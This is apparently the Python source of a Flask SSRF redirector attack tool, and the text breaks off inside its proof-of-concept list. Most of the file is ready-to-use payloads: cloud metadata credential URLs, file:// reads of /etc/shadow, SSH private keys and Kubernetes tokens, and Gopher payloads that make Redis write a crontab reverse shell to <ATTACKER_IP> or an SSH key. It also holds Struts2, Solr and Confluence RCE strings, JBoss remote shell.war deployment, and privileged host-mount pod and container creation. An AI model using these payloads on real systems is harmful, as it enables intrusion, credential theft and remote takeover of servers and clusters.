#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSRF 30x Redirector - 终极无状态链式增强版 (云原生实战特化)
================================================
【实战集成】全HTTP方法支持 + K8s/Docker高危POST探测全自动化 + 无状态Base64链 + Gopher自动装填
+ 三大模块高级请求编辑：基础跳转 / 智能链 / 有状态链 均可自定义请求头与请求体
【本次优化】POST POC已包含完整请求体，选择POC后自动预加载Headers与Body，直接可用或修改
【功能调整】1.删除日志仅前端隐藏,后端保留 2.日志显示北京时间 3.有状态链实时查看/删除/修改末跳
【新增功能】有状态链支持批量输入POC队列，后端按顺序依次响应
【v1.3新增】队列批量预填充子模块 + Burp风格原始HTTP请求编辑器
【v1.4新增】HEAD伪装绕过模式 - 解决服务器HEAD探测后拒绝跟随30x的问题
"""
from flask import Flask, request, redirect, render_template_string, jsonify, make_response, abort
import time
import uuid
import json
import base64
from datetime import datetime, timezone, timedelta
from urllib.parse import quote_plus

app = Flask(__name__)
app.secret_key = str(uuid.uuid4())

# 北京时间 UTC+8
BEIJING_TZ = timezone(timedelta(hours=8))

# ==================== 配置 ====================
CONFIG = {
    'port': 5000,
    'host': '0.0.0.0',
    'max_logs': 1000,
    'default_status_code': 302,
    'access_token': None,
}

VALID_30X_CODES = {300, 301, 302, 303, 304, 305, 306, 307, 308}
SUPPORTED_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'TRACE', 'OPTIONS', 'HEAD', 'CONNECT']

# HEAD伪装响应的默认配置
HEAD_BYPASS_CONFIG = {
    'status_code': 200,
    'content_type': 'text/html; charset=utf-8',
    'fake_content_length': '8192',
    'extra_headers': {
        'Server': 'nginx/1.18.0',
        'X-Powered-By': 'PHP/7.4.3',
        'Connection': 'keep-alive',
        'Accept-Ranges': 'bytes',
    }
}

# ==================== 全局存储 ====================
LOGS = []
STATEFUL_CHAINS = {}
PATH_MAP = {}

# ==================== 批量队列预设模板 ====================
QUEUE_PRESETS = {
    "local_ports": {
        "name": "🔍 本地端口服务扫描",
        "description": "扫描本机常见端口服务(HTTP/SSH/Redis/FTP/SMTP等)",
        "payloads": [
            "http://127.0.0.1:21/",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:23/",
            "http://127.0.0.1:25/",
            "http://127.0.0.1:80/",
            "http://127.0.0.1:110/",
            "http://127.0.0.1:443/",
            "http://127.0.0.1:445/",
            "http://127.0.0.1:873/",
            "http://127.0.0.1:1080/",
            "http://127.0.0.1:1433/",
            "http://127.0.0.1:1521/",
            "http://127.0.0.1:2049/",
            "http://127.0.0.1:2181/",
            "http://127.0.0.1:2375/",
            "http://127.0.0.1:2376/",
            "http://127.0.0.1:3000/",
            "http://127.0.0.1:3306/",
            "http://127.0.0.1:4848/",
            "http://127.0.0.1:5000/",
            "http://127.0.0.1:5432/",
            "http://127.0.0.1:5672/",
            "http://127.0.0.1:5900/",
            "http://127.0.0.1:6379/",
            "http://127.0.0.1:6443/",
            "http://127.0.0.1:7001/",
            "http://127.0.0.1:7002/",
            "http://127.0.0.1:8000/",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:8081/",
            "http://127.0.0.1:8443/",
            "http://127.0.0.1:8888/",
            "http://127.0.0.1:9000/",
            "http://127.0.0.1:9090/",
            "http://127.0.0.1:9200/",
            "http://127.0.0.1:9300/",
            "http://127.0.0.1:9443/",
            "http://127.0.0.1:10250/",
            "http://127.0.0.1:10255/",
            "http://127.0.0.1:11211/",
            "http://127.0.0.1:15672/",
            "http://127.0.0.1:27017/",
            "http://127.0.0.1:28017/",
            "http://127.0.0.1:50070/",
            "http://127.0.0.1:50075/",
        ]
    },
    "local_ports_dict": {
        "name": "🔍 Dict协议端口扫描",
        "description": "使用dict协议探测非HTTP服务(Redis/MySQL/SSH/FTP/SMTP等)",
        "payloads": [
            "dict://127.0.0.1:21/",
            "dict://127.0.0.1:22/",
            "dict://127.0.0.1:23/",
            "dict://127.0.0.1:25/EHLO test",
            "dict://127.0.0.1:110/",
            "dict://127.0.0.1:143/",
            "dict://127.0.0.1:389/",
            "dict://127.0.0.1:445/",
            "dict://127.0.0.1:1433/",
            "dict://127.0.0.1:1521/",
            "dict://127.0.0.1:3306/",
            "dict://127.0.0.1:5432/",
            "dict://127.0.0.1:5672/",
            "dict://127.0.0.1:6379/INFO",
            "dict://127.0.0.1:6379/KEYS *",
            "dict://127.0.0.1:9000/",
            "dict://127.0.0.1:11211/stats",
            "dict://127.0.0.1:27017/",
        ]
    },
    "spring_actuator": {
        "name": "🌱 Spring Boot Actuator",
        "description": "Spring Boot敏感端点探测(env/heapdump/configprops等)",
        "payloads": [
            "http://127.0.0.1:8080/actuator",
            "http://127.0.0.1:8080/actuator/env",
            "http://127.0.0.1:8080/actuator/health",
            "http://127.0.0.1:8080/actuator/info",
            "http://127.0.0.1:8080/actuator/beans",
            "http://127.0.0.1:8080/actuator/configprops",
            "http://127.0.0.1:8080/actuator/mappings",
            "http://127.0.0.1:8080/actuator/metrics",
            "http://127.0.0.1:8080/actuator/heapdump",
            "http://127.0.0.1:8080/actuator/threaddump",
            "http://127.0.0.1:8080/actuator/loggers",
            "http://127.0.0.1:8080/actuator/trace",
            "http://127.0.0.1:8080/actuator/httptrace",
            "http://127.0.0.1:8080/actuator/scheduledtasks",
            "http://127.0.0.1:8080/actuator/conditions",
            "http://127.0.0.1:8080/actuator/auditevents",
            "http://127.0.0.1:8080/actuator/jolokia",
            "http://127.0.0.1:8080/actuator/gateway/routes",
            "http://127.0.0.1:8080/env",
            "http://127.0.0.1:8080/health",
            "http://127.0.0.1:8080/info",
            "http://127.0.0.1:8080/beans",
            "http://127.0.0.1:8080/configprops",
            "http://127.0.0.1:8080/mappings",
            "http://127.0.0.1:8080/metrics",
            "http://127.0.0.1:8080/heapdump",
            "http://127.0.0.1:8080/trace",
            "http://127.0.0.1:8080/jolokia",
            "http://127.0.0.1:8080/jolokia/list",
            "http://127.0.0.1:8080/api-docs",
            "http://127.0.0.1:8080/swagger-ui.html",
            "http://127.0.0.1:8080/v2/api-docs",
        ]
    },
    "k8s_services": {
        "name": "☸️ K8s集群服务探测",
        "description": "Kubernetes集群内部服务端点探测",
        "payloads": [
            "https://kubernetes.default.svc/api",
            "https://kubernetes.default.svc/api/v1",
            "https://kubernetes.default.svc/api/v1/pods",
            "https://kubernetes.default.svc/api/v1/secrets",
            "https://kubernetes.default.svc/api/v1/services",
            "https://kubernetes.default.svc/api/v1/nodes",
            "https://kubernetes.default.svc/api/v1/namespaces",
            "https://kubernetes.default.svc/api/v1/configmaps",
            "https://kubernetes.default.svc/api/v1/endpoints",
            "https://kubernetes.default.svc/apis/apps/v1/deployments",
            "https://kubernetes.default.svc/apis/apps/v1/daemonsets",
            "https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterroles",
            "https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
            "https://kubernetes.default.svc/version",
            "https://kubernetes.default.svc/healthz",
            "https://kubernetes.default.svc/readyz",
            "https://kubernetes.default.svc/livez",
            "https://127.0.0.1:10250/pods",
            "https://127.0.0.1:10250/metrics",
            "https://127.0.0.1:10250/runningpods/",
            "https://127.0.0.1:10250/stats/summary",
            "http://127.0.0.1:10255/pods",
            "http://127.0.0.1:10255/metrics",
            "http://127.0.0.1:8001/api/v1/pods",
            "http://127.0.0.1:8001/api/v1/secrets",
            "http://127.0.0.1:2379/version",
            "http://127.0.0.1:2379/v2/keys/",
            "http://127.0.0.1:2379/v2/members",
            "http://127.0.0.1:6443/api",
            "http://127.0.0.1:8080/api/v1/pods",
        ]
    },
    "docker_api": {
        "name": "🐳 Docker API探测",
        "description": "Docker Remote API端点扫描",
        "payloads": [
            "http://127.0.0.1:2375/version",
            "http://127.0.0.1:2375/info",
            "http://127.0.0.1:2375/containers/json",
            "http://127.0.0.1:2375/containers/json?all=1",
            "http://127.0.0.1:2375/images/json",
            "http://127.0.0.1:2375/volumes",
            "http://127.0.0.1:2375/networks",
            "http://127.0.0.1:2375/events",
            "http://127.0.0.1:2375/swarm",
            "http://127.0.0.1:2375/nodes",
            "http://127.0.0.1:2375/services",
            "http://127.0.0.1:2375/secrets",
            "http://127.0.0.1:2375/configs",
            "http://127.0.0.1:2376/version",
            "http://127.0.0.1:2376/containers/json",
            "http://172.17.0.1:2375/version",
            "http://172.17.0.1:2375/containers/json",
        ]
    },
    "database_services": {
        "name": "🗄️ 数据库服务探测",
        "description": "MySQL/PostgreSQL/ClickHouse/Oracle/MongoDB/Redis等数据库探测",
        "payloads": [
            "http://127.0.0.1:3306/",
            "dict://127.0.0.1:3306/",
            "http://127.0.0.1:5432/",
            "dict://127.0.0.1:5432/",
            "http://127.0.0.1:1521/",
            "dict://127.0.0.1:1521/",
            "http://127.0.0.1:1433/",
            "dict://127.0.0.1:1433/",
            "http://127.0.0.1:6379/",
            "dict://127.0.0.1:6379/INFO",
            "dict://127.0.0.1:6379/CONFIG GET *",
            "dict://127.0.0.1:6379/DBSIZE",
            "http://127.0.0.1:27017/",
            "http://127.0.0.1:28017/",
            "http://127.0.0.1:27017/serverStatus",
            "http://127.0.0.1:11211/",
            "dict://127.0.0.1:11211/stats",
            "dict://127.0.0.1:11211/stats items",
            "http://127.0.0.1:8123/",
            "http://127.0.0.1:8123/?query=SELECT%201",
            "http://127.0.0.1:8123/?query=SHOW%20DATABASES",
            "http://127.0.0.1:8123/?query=SHOW%20TABLES",
            "http://127.0.0.1:9000/",
            "http://127.0.0.1:9004/",
            "http://127.0.0.1:5984/",
            "http://127.0.0.1:5984/_all_dbs",
            "http://127.0.0.1:5984/_config",
            "http://127.0.0.1:7474/",
            "http://127.0.0.1:7474/browser/",
            "http://127.0.0.1:9042/",
            "http://127.0.0.1:15672/api/overview",
            "http://127.0.0.1:15672/api/queues",
            "http://127.0.0.1:8529/",
            "http://127.0.0.1:8529/_api/version",
        ]
    },
    "cloud_metadata": {
        "name": "☁️ 云元数据全量探测",
        "description": "AWS/阿里云/腾讯云/GCP/Azure/华为云元数据",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/public-ipv4",
            "http://169.254.169.254/latest/meta-data/ami-id",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/instance-type",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            "http://100.100.100.200/latest/meta-data/instance-id",
            "http://100.100.100.200/latest/meta-data/hostname",
            "http://100.100.100.200/latest/meta-data/image-id",
            "http://100.100.100.200/latest/user-data",
            "http://169.254.0.211/latest/meta-data/",
            "http://169.254.0.211/latest/meta-data/instance-id",
            "http://169.254.0.211/latest/meta-data/cam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/project/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "http://169.254.169.254/openstack/latest/meta_data.json",
            "http://169.254.169.254/openstack/latest/user_data",
        ]
    },
    "internal_webapp": {
        "name": "🌐 内网Web应用探测",
        "description": "Tomcat/Jenkins/Nacos/Consul/Grafana/Harbor等管理后台",
        "payloads": [
            "http://127.0.0.1:8080/manager/html",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:8080/script",
            "http://127.0.0.1:8080/jenkins/script",
            "http://127.0.0.1:8848/nacos/",
            "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=&group=&tenant=",
            "http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9",
            "http://127.0.0.1:8500/v1/agent/self",
            "http://127.0.0.1:8500/v1/kv/?recurse",
            "http://127.0.0.1:8500/v1/catalog/services",
            "http://127.0.0.1:3000/api/admin/settings",
            "http://127.0.0.1:3000/api/dashboards/home",
            "http://127.0.0.1:3000/api/org",
            "http://127.0.0.1:9090/api/v1/targets",
            "http://127.0.0.1:9090/api/v1/status/config",
            "http://127.0.0.1:9090/api/v1/label/__name__/values",
            "http://127.0.0.1:8161/admin/",
            "http://127.0.0.1:15672/api/overview",
            "http://127.0.0.1:8088/ws/v1/cluster/apps",
            "http://127.0.0.1:8088/ws/v1/cluster/nodes",
            "http://127.0.0.1:50070/",
            "http://127.0.0.1:50075/",
            "http://127.0.0.1:8983/solr/admin/cores",
            "http://127.0.0.1:9200/_cat/indices",
            "http://127.0.0.1:9200/_cluster/health",
            "http://127.0.0.1:9200/_nodes",
            "http://127.0.0.1:5601/api/status",
            "http://127.0.0.1:8000/",
            "http://127.0.0.1:4443/",
            "http://127.0.0.1:10080/",
        ]
    },
    "file_read": {
        "name": "📁 敏感文件读取",
        "description": "file协议读取系统/应用敏感文件",
        "payloads": [
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///etc/hostname",
            "file:///etc/resolv.conf",
            "file:///etc/issue",
            "file:///etc/os-release",
            "file:///etc/crontab",
            "file:///etc/nginx/nginx.conf",
            "file:///etc/apache2/sites-enabled/000-default.conf",
            "file:///etc/httpd/conf/httpd.conf",
            "file:///etc/mysql/my.cnf",
            "file:///etc/redis/redis.conf",
            "file:///etc/ssh/sshd_config",
            "file:///root/.ssh/id_rsa",
            "file:///root/.ssh/authorized_keys",
            "file:///root/.bash_history",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///proc/self/cgroup",
            "file:///proc/self/mountinfo",
            "file:///proc/1/cgroup",
            "file:///proc/net/tcp",
            "file:///proc/net/arp",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/namespace",
            "file:///var/www/html/config.php",
            "file:///var/www/html/.env",
            "file:///usr/local/tomcat/conf/tomcat-users.xml",
            "file:///usr/local/tomcat/conf/server.xml",
            "file:///opt/application/application.yml",
            "file:///opt/application/application.properties",
        ]
    },
    "cidr_scan_10": {
        "name": "🌐 内网C段探测 (10.0.0.x)",
        "description": "探测10.0.0.1-10.0.0.20的HTTP服务",
        "payloads": [f"http://10.0.0.{i}/" for i in range(1, 21)]
    },
    "cidr_scan_172": {
        "name": "🌐 内网C段探测 (172.17.0.x)",
        "description": "探测Docker默认网桥172.17.0.1-172.17.0.20",
        "payloads": [f"http://172.17.0.{i}/" for i in range(1, 21)]
    },
    "cidr_scan_192": {
        "name": "🌐 内网C段探测 (192.168.1.x)",
        "description": "探测192.168.1.1-192.168.1.20的HTTP服务",
        "payloads": [f"http://192.168.1.{i}/" for i in range(1, 21)]
    },
}

# ==================== 内置实战 POC 列表 (大幅强化版 + 完整请求体) ====================
POC_LIST = [
    # ---------- 云元数据 ----------
    {'name': 'AWS 元数据 v1', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/latest/meta-data/', 'description': 'AWS EC2实例元数据服务'},
    {'name': 'AWS 元数据 v2 Token', 'category': '云元数据', 'method': 'PUT', 
     'payload': 'http://169.254.169.254/latest/api/token', 
     'description': 'IMDSv2 获取令牌 (需PUT)',
     'headers': {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}},
    {'name': 'AWS 元数据 IAM角色名', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'description': '列出IAM角色名'},
    {'name': '阿里云元数据探测', 'category': '云元数据', 'method': 'GET', 'payload': 'http://100.100.100.200/latest/meta-data/', 'description': '阿里云ECS元数据服务'},
    {'name': '阿里云 RAM 角色凭证', 'category': '云元数据', 'method': 'GET', 'payload': 'http://100.100.100.200/latest/meta-data/ram/security-credentials/', 'description': '获取RAM角色临时凭证名'},
    {'name': '腾讯云元数据探测', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.0.211/latest/meta-data/', 'description': '腾讯云CVM元数据服务'},
    {'name': 'Google Cloud 元数据', 'category': '云元数据', 'method': 'GET', 'payload': 'http://metadata.google.internal/computeMetadata/v1/', 'description': 'GCP元数据(需Header)'},
    {'name': 'Azure 元数据 (2021)', 'category': '云元数据', 'method': 'GET', 
     'payload': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', 
     'description': 'Azure实例元数据 (需Header: Metadata:true)',
     'headers': {'Metadata': 'true'}},
    {'name': '华为云元数据', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/openstack/latest/meta_data.json', 'description': '华为云/OpenStack 元数据'},
    {'name': 'OpenStack 元数据', 'category': '云元数据', 'method': 'GET', 'payload': 'http://169.254.169.254/openstack', 'description': 'OpenStack 通用元数据端点'},

    # ---------- 高危端口/服务探测 ----------
    {'name': 'Redis 未授权探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:6379/info', 'description': 'dict协议探测Redis服务信息'},
    {'name': 'MySQL 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:3306/', 'description': '探测MySQL端口是否开放'},
    {'name': 'Memcached 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:11211/stats', 'description': '探测Memcached状态'},
    {'name': 'SSH 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:22/', 'description': '探测SSH服务'},
    {'name': 'Elasticsearch 9200 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:9200/', 'description': 'Elasticsearch HTTP接口'},
    {'name': 'Docker API 2375 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:2375/version', 'description': 'Docker Remote API版本探测'},
    {'name': 'Kubelet 10250 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'https://127.0.0.1:10250/metrics', 'description': 'Kubelet metrics接口 (需处理TLS)'},
    {'name': 'Zabbix 10051 探测', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:10051/', 'description': 'Zabbix Server端口'},
    {'name': 'SMTP 25 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:25/', 'description': 'SMTP服务'},
    {'name': 'FTP 21 端口探测', 'category': '端口探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:21/', 'description': 'FTP服务'},
    {'name': '内网 HTTP 代理探测 (8080)', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:8080/', 'description': '常见Web应用端口'},

    # ---------- Gopher 攻击模板 ----------
    {'name': 'Gopher -> Redis 写计划任务反弹Shell (CentOS)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$2%0d%0ap1%0d%0a$64%0d%0a%0d%0a*/1 * * * * bash -i >%26 /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>%261%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
     'description': 'Redis未授权写入crontab反弹shell (CentOS, 需替换占位符)'},
    {'name': 'Gopher -> Redis 写计划任务反弹Shell (Ubuntu/Debian)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$25%0d%0a/var/spool/cron/crontabs/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$2%0d%0ap1%0d%0a$64%0d%0a%0d%0a*/1 * * * * bash -i >%26 /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>%261%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
     'description': 'Redis未授权写入crontab反弹shell (Ubuntu/Debian, 需替换占位符)'},
    {'name': 'Gopher -> Redis 写入SSH公钥 (需替换公钥)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$390%0d%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAA... 请替换为你的SSH公钥 %0a%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
     'description': 'Redis未授权写入SSH公钥 (需替换占位符和公钥)'},
    {'name': 'Gopher -> FastCGI 代码执行 (PHP-FPM)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0f%10SCRIPT_FILENAME/var/www/html/index.php%01%04%00%01%00%00%00%00%01%05%00%01%00%18%04%00PHP_VALUEauto_prepend_file%20%3d%20php%3a//input%01%04%00%01%00%00%00%00%01%05%00%01%00%18%00%00%3C%3Fphp%20system(%27id%27)%3B%3F%3E',
     'description': '攻击PHP-FPM FastCGI执行系统命令 (需确认PHP文件路径)'},
    {'name': 'Gopher -> SMTP 发送邮件', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:25/_EHLO%20localhost%0d%0aMAIL%20FROM%3a%20<admin@internal.com>%0d%0aRCPT%20TO%3a%20<attacker@external.com>%0d%0aDATA%0d%0aSubject%3a%20SSRF%20PenTest%0d%0a%0d%0aThis%20is%20a%20test%20email.%0d%0a.%0d%0aQUIT%0d%0a',
     'description': '利用SMTP发送邮件用于钓鱼/带外'},

    # ---------- 文件读取 ----------
    {'name': '读取 /etc/passwd', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/passwd', 'description': '读取Linux账户信息'},
    {'name': '读取 /etc/shadow (需root)', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/shadow', 'description': '尝试读取影子文件（需高权限）'},
    {'name': '读取 SSH 私钥', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///root/.ssh/id_rsa', 'description': '读取root SSH私钥'},
    {'name': '读取 K8s ServiceAccount Token', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///var/run/secrets/kubernetes.io/serviceaccount/token', 'description': 'Pod内SA Token文件'},
    {'name': '读取 /proc/self/environ', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///proc/self/environ', 'description': '环境变量可能包含敏感信息'},
    {'name': '读取 Windows 配置文件', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///C:/Windows/System32/drivers/etc/hosts', 'description': 'Windows hosts文件'},
    {'name': '读取 Apache 配置文件', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/apache2/sites-enabled/000-default.conf', 'description': 'Apache虚拟主机配置'},
    {'name': '读取 Nginx 配置文件', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/nginx/nginx.conf', 'description': 'Nginx主配置文件'},
    {'name': '读取 Tomcat users.xml', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///usr/local/tomcat/conf/tomcat-users.xml', 'description': 'Tomcat管理用户密码'},
    {'name': '读取 应用源码 (常见路径)', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///var/www/html/config.php', 'description': 'PHP应用数据库配置'},
    {'name': 'Java netdoc协议读文件', 'category': '文件读取', 'method': 'GET', 'payload': 'netdoc:///etc/passwd', 'description': '利用Java netdoc协议读取文件'},

    # ---------- 内网漏洞利用 ----------
    {'name': 'Struts2 S2-032 RCE (id命令)', 'category': '内网漏洞利用', 'method': 'GET',
     'payload': 'http://127.0.0.1:8080/struts2-showcase/actionChain1.action?redirect:%24%7b%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5b%5d%7b%27sh%27,%20%27-c%27,%20%27id%27%7d)).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char%5b50000%5d,%23c.read(%23d),%23out%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23out.getWriter().println(new%20java.lang.String(%23d)),%23out.close()%7d',
     'description': 'Struts2 S2-032远程代码执行 (GET方式, 可替换命令)'},
    {'name': 'Apache Solr 未授权 RCE (CVE-2017-12629)', 'category': '内网漏洞利用', 'method': 'GET',
     'payload': 'http://127.0.0.1:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end',
     'description': 'Solr Velocity模板注入RCE'},
    {'name': 'JBoss JMX Console 未授权 RCE', 'category': '内网漏洞利用', 'method': 'GET',
     'payload': 'http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://<ATTACKER_IP>/shell.war',
     'description': 'JBoss未授权远程部署WAR (需搭建恶意war服务器)'},
    {'name': 'Confluence OGNL 注入 (CVE-2021-26084)', 'category': '内网漏洞利用', 'method': 'POST',
     'payload': 'http://127.0.0.1:8090/pages/createpage-entervariables.action',
     'description': 'Confluence OGNL注入RCE (POST方法)',
     'body': 'queryString=%5Cu0027%2b%7bClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027js%5Cu0027%29.eval%28%5Cu0027var+is%3dnew+java.io.BufferedReader%28new+java.io.InputStreamReader%28java.lang.Runtime.getRuntime%28%29.exec%28%5Cu0027id%5Cu0027%29.getInputStream%28%29%29%29%3bvar+ss%3d%5Cu0027%5Cu0027%3bwhile%28%28line%3dis.readLine%28%29%29+!%3d+null%29+ss%2b%3dline%3b%5Cu0027%29%7d%2b%5Cu0027'},

    # ---------- K8s/容器 实战特化 ----------
    {'name': 'K8s API Server 探测', 'category': 'K8s 渗透', 'method': 'GET', 'payload': 'https://kubernetes.default.svc/api', 'description': '探测集群内网API Server'},
    {'name': 'K8s 创建恶意Pod (POST)', 'category': 'K8s 渗透', 'method': 'POST', 
     'payload': 'https://kubernetes.default.svc/api/v1/namespaces/default/pods', 
     'description': '尝试利用当前SA创建提权/逃逸Pod',
     'body': json.dumps({"apiVersion":"v1","kind":"Pod","metadata":{"name":"evil-pod"},"spec":{"containers":[{"name":"evil","image":"busybox","command":["/bin/sh","-c","sleep 3600"],"securityContext":{"privileged":True},"volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}, indent=2)},
    {'name': 'K8s 提取Token (POST)', 'category': 'K8s 渗透', 'method': 'POST', 
     'payload': 'https://kubernetes.default.svc/api/v1/namespaces/kube-system/serviceaccounts/default/token', 
     'description': 'POST请求生成高权限SA的Token',
     'body': json.dumps({"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest"})},
    {'name': 'K8s 列举所有 Secrets', 'category': 'K8s 渗透', 'method': 'GET', 'payload': 'https://kubernetes.default.svc/api/v1/secrets', 'description': '列举集群中的Secrets（需权限）'},
    {'name': 'K8s 列举 Pods', 'category': 'K8s 渗透', 'method': 'GET', 'payload': 'https://kubernetes.default.svc/api/v1/pods', 'description': '列举所有Pod'},

    {'name': 'Kubelet 端口访问探测', 'category': 'Kubelet 渗透', 'method': 'GET', 'payload': 'https://127.0.0.1:10250/pods', 'description': '探测Kubelet未授权访问'},
    {'name': 'Kubelet 执行系统命令 (POST)', 'category': 'Kubelet 渗透', 'method': 'POST', 
     'payload': 'https://127.0.0.1:10250/run/kube-system/kube-dns/dns', 
     'description': '通过Kubelet API无损命令执行(需替换命名空间/Pod名)',
     'body': '{"cmd": ["id"]}'},
    {'name': 'Kubelet exec (标准端点)', 'category': 'Kubelet 渗透', 'method': 'GET', 'payload': 'https://127.0.0.1:10250/exec/kube-system/kube-dns/dns', 'description': 'Kubelet exec检查'},

    {'name': 'Docker 获取容器列表', 'category': 'Docker 渗透', 'method': 'GET', 'payload': 'http://127.0.0.1:2375/containers/json', 'description': '探测Docker API版本及容器'},
    {'name': 'Docker 创建恶意容器 (POST)', 'category': 'Docker 渗透', 'method': 'POST', 
     'payload': 'http://127.0.0.1:2375/containers/create', 
     'description': '直接利用Docker API创建挂载特权目录的容器',
     'body': json.dumps({"Image": "busybox", "Cmd": ["/bin/sh", "-c", "sleep 3600"], "HostConfig": {"Binds": ["/:/mnt"]}}, indent=2)},
